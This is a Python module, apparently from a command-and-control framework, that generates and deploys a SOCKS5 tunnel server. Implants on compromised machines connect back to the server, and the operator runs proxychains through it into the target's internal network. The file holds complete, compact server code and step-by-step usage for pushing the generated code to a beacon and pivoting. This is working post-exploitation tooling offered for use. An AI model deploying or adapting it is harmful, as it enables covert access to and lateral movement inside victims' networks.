"""
@module: socks_server
@desc: 生成 SOCKS5 隧道服务端一键部署代码: 部署到公网服务器后监听隧道端口
(植入物连接) 与 SOCKS5 代理端口(操作员 proxychains 入口), 经植入物打通到
目标内网的 socks 隧道。操作员连接 → 服务端经隧道下发 CONNECT → 植入物
连目标 → 双向转发。
@params: tunnel_port [socks_port] [out_dir]
"""
import json
import os

from server.core.bootstrap import deploy_command

MODULE = {
    "desc": "生成 SOCKS5 隧道服务端一键部署代码(独立部署, 植入物直连)",
    "params": [
        ("tunnel_port", "必填；隧道端口(植入物连接)"),
        ("socks_port", "可选；SOCKS5 代理端口,默认 tunnel_port+1(操作员连接)"),
        ("out_dir", "默认 s_modules/output"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

# 部署机自包含服务端代码(纯 stdlib)。短名节省载荷体积。
_CODE = '''\
import socket as s,threading as t,os,struct
TP={tp};SP={sp};PEND={{}};CTRL=[]
def _f(a,b):
 def g(x,d):
  try:
   while 1:
    y=x.recv(65536)
    if not y:break
    d.sendall(y)
  except:pass
  finally:
   try:d.shutdown(2)
   except:pass
 t.Thread(target=g,args=(a,b),daemon=True).start();g(b,a)
def _cs(l):
 for c in list(CTRL):
  try:c.sendall(l.encode())
  except:
   try:CTRL.remove(c)
   except:pass
def _h(c):
 c.settimeout(120)
 try:
  d=c.recv(4096).decode(errors='replace').strip()
  if d.startswith('REG '):
   CTRL.append(c)
   while 1:
    if not c.recv(4096):break
   try:CTRL.remove(c)
   except:pass
  elif d.startswith('HELLO '):
   k=d.split()[2];cl=PEND.pop(k,None)
   if cl:_f(cl,c)
 except:pass
 finally:
  try:c.close()
  except:pass
def _tun():
 ls=s.socket();ls.setsockopt(1,2,1);ls.bind(('0.0.0.0',TP));ls.listen(64)
 while 1:
  try:c,_=ls.accept()
  except:break
  t.Thread(target=_h,args=(c,),daemon=True).start()
def _px(c):
 try:
  c.settimeout(30)
  h=c.recv(2)
  if not h or h[0]!=5:c.close();return
  c.recv(h[1]);c.sendall(b'\\x05\\x00')
  v=c.recv(4);at=v[3]
  if at==1:hp=s.inet_ntoa(c.recv(4))
  elif at==3:hp=c.recv(c.recv(1)[0]).decode()
  elif at==4:hp=s.inet_ntop(s.AF_INET6,c.recv(16))
  else:c.close();return
  pt=struct.unpack('>H',c.recv(2))[0]
  c.sendall(b'\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
  k=os.urandom(8).hex();PEND[k]=c
  _cs('CONN %s %s %d\\n'%(k,hp,pt))
 except:
  import sys
  print('px err:',sys.exc_info()[1],file=sys.stderr)
  try:c.close()
  except:pass
def _s5():
 ls=s.socket();ls.setsockopt(1,2,1);ls.bind(('0.0.0.0',SP));ls.listen(64)
 while 1:
  try:c,_=ls.accept()
  except:break
  t.Thread(target=_px,args=(c,),daemon=True).start()
t.Thread(target=_tun,daemon=True).start();_s5()
'''


def run(tunnel_port, socks_port=None, out_dir=None):
    """生成 SOCKS5 隧道服务端代码与一键部署命令。"""
    tp = int(tunnel_port)
    sp = int(socks_port) if socks_port else tp + 1
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)
    code = _CODE.format(tp=tp, sp=sp)
    compile(code, "<socks_server>", "exec")  # 生成即校验
    command = deploy_command(code)
    cmd_file = os.path.join(out_dir, "socks_server_command.txt")
    with open(cmd_file, "w", encoding="utf-8") as f:
        f.write(command + "\n")
    return {
        "status": "ok",
        "tunnel_port": tp,
        "socks_port": sp,
        "command": command,
        "code_len": len(code),
        "usage": (f"1) 把上面 command 部署到公网服务器(echo ... | python3)\n"
                  f"2) 下发植入物端: s_exec socks {sp} 后把生成代码下发 beacon 执行\n"
                  f"   (或 console: socks <server_ip> {tp})\n"
                  f"3) 操作机 proxychains 配 socks5 <server_ip>:{sp} 即可访问目标内网\n"
                  f"4) 停止服务端后植入物 socks 线程自动退出"),
    }
